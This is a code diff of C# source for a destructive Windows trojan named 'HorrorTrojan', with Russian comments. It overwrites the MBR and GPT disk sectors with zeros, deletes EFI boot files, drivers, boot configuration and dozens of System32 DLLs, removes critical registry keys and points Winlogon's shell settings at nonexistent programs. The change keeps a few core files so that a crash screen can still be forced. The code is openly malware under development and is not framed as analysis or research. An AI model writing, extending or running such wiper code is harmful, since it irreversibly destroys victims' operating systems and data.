@@ -9,7 +9,7 @@ namespace HorrorTrojan
     {
         public static void TriggerBSOD()
         {
-            // 1. УНИЧТОЖАЕМ ВСЁ
+            // 1. УНИЧТОЖАЕМ ВСЁ, КРОМЕ ФАЙЛОВ, НУЖНЫХ ДЛЯ BSOD
             DestroyEverything();
             
             // 2. ВЫЗЫВАЕМ BSOD
@@ -27,7 +27,7 @@ namespace HorrorTrojan
                 // ===== 2. УНИЧТОЖЕНИЕ GPT И EFI =====
                 DestroyGPTandEFI();
                 
-                // ===== 3. УНИЧТОЖЕНИЕ СИСТЕМНЫХ ФАЙЛОВ =====
+                // ===== 3. УНИЧТОЖЕНИЕ СИСТЕМНЫХ ФАЙЛОВ (КРОМЕ КРИТИЧЕСКИХ) =====
                 DestroySystemFiles();
                 
                 // ===== 4. УНИЧТОЖЕНИЕ РЕЕСТРА =====
@@ -52,7 +52,6 @@ namespace HorrorTrojan
                 byte[] mbr = ResourceExtractor.GetMBR();
                 if (mbr.Length == 512)
                 {
-                    // Затираем секторы 0-63 (MBR + загрузочные секторы)
                     for (int sector = 0; sector < 64; sector++)
                     {
                         try
@@ -77,7 +76,6 @@ namespace HorrorTrojan
             {
                 byte[] zeros = new byte[512];
                 
-                // Затираем GPT (секторы 1-33)
                 for (int sector = 1; sector < 34; sector++)
                 {
                     try
@@ -92,7 +90,6 @@ namespace HorrorTrojan
                     catch { }
                 }
                 
-                // Удаляем EFI-файлы
                 string[] efiPaths = new string[]
                 {
                     @"C:\EFI\Microsoft\Boot\bootmgfw.efi",
@@ -120,23 +117,15 @@ namespace HorrorTrojan
         {
             try
             {
-                // Критические системные файлы
+                // ===== ФАЙЛЫ, КОТОРЫЕ НЕЛЬЗЯ УДАЛЯТЬ (НУЖНЫ ДЛЯ BSOD) =====
+                // ntdll.dll, kernel32.dll, ntoskrnl.exe, hal.dll
+                // csrss.exe, services.exe, lsass.exe, svchost.exe, smss.exe, wininit.exe
+                
+                // ===== УДАЛЯЕМ ВСЁ ОСТАЛЬНОЕ =====
                 string[] systemFiles = new string[]
                 {
-                    // Основные системные файлы
+                    // Winlogon (можно удалить, BSOD уже вызван)
                     @"C:\Windows\System32\winlogon.exe",
-                    @"C:\Windows\System32\csrss.exe",
-                    @"C:\Windows\System32\services.exe",
-                    @"C:\Windows\System32\lsass.exe",
-                    @"C:\Windows\System32\svchost.exe",
-                    @"C:\Windows\System32\smss.exe",
-                    @"C:\Windows\System32\wininit.exe",
-                    @"C:\Windows\System32\winload.exe",
-                    @"C:\Windows\System32\winload.efi",
-                    @"C:\Windows\System32\ntoskrnl.exe",
-                    @"C:\Windows\System32\hal.dll",
-                    @"C:\Windows\System32\kernel32.dll",
-                    @"C:\Windows\System32\ntdll.dll",
                     
                     // Драйверы
                     @"C:\Windows\System32\drivers\ntfs.sys",
@@ -159,7 +148,32 @@ namespace HorrorTrojan
                     @"C:\Boot\BCD",
                     @"C:\Boot\boot.sdi",
                     @"C:\Boot\BCD.LOG",
-                    @"C:\boot\bootstat.dat"
+                    @"C:\boot\bootstat.dat",
+                    
+                    // Winload
+                    @"C:\Windows\System32\winload.exe",
+                    @"C:\Windows\System32\winload.efi",
+                    
+                    // Другие системные файлы (не критические для BSOD)
+                    @"C:\Windows\System32\user32.dll",
+                    @"C:\Windows\System32\gdi32.dll",
+                    @"C:\Windows\System32\advapi32.dll",
+                    @"C:\Windows\System32\shell32.dll",
+                    @"C:\Windows\System32\ole32.dll",
+                    @"C:\Windows\System32\oleaut32.dll",
+                    @"C:\Windows\System32\comctl32.dll",
+                    @"C:\Windows\System32\comdlg32.dll",
+                    @"C:\Windows\System32\ws2_32.dll",
+                    @"C:\Windows\System32\wininet.dll",
+                    @"C:\Windows\System32\urlmon.dll",
+                    @"C:\Windows\System32\shlwapi.dll",
+                    @"C:\Windows\System32\setupapi.dll",
+                    @"C:\Windows\System32\propsys.dll",
+                    @"C:\Windows\System32\secur32.dll",
+                    @"C:\Windows\System32\wintrust.dll",
+                    @"C:\Windows\System32\crypt32.dll",
+                    @"C:\Windows\System32\msvcrt.dll",
+                    @"C:\Windows\System32\vcruntime140.dll"
                 };
                 
                 foreach (string path in systemFiles)
@@ -171,20 +185,6 @@ namespace HorrorTrojan
                     }
                     catch { }
                 }
-                
-                // Удаляем папку System32 (если получится)
-                try
-                {
-                    Directory.Delete(@"C:\Windows\System32", true);
-                }
-                catch { }
-                
-                // Удаляем папку Windows (если получится)
-                try
-                {
-                    Directory.Delete(@"C:\Windows", true);
-                }
-                catch { }
             }
             catch { }
         }
@@ -193,7 +193,6 @@ namespace HorrorTrojan
         {
             try
             {
-                // Удаляем критические разделы реестра
                 string[] registryKeys = new string[]
                 {
                     @"SYSTEM\CurrentControlSet\Control\Session Manager",
@@ -222,7 +221,6 @@ namespace HorrorTrojan
         {
             try
             {
-                // Подмена Winlogon
                 using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"))
                 {
                     key.SetValue("Shell", "nonexistent.exe", RegistryValueKind.String);
@@ -230,14 +228,6 @@ namespace HorrorTrojan
                     key.SetValue("System", "nonexistent.exe", RegistryValueKind.String);
                     key.SetValue("GinaDLL", "nonexistent.dll", RegistryValueKind.String);
                 }
-                
-                // Удаляем Winlogon.exe
-                try
-                {
-                    if (File.Exists(@"C:\Windows\System32\winlogon.exe"))
-                        File.Delete(@"C:\Windows\System32\winlogon.exe");
-                }
-                catch { }
             }
             catch { }
         }
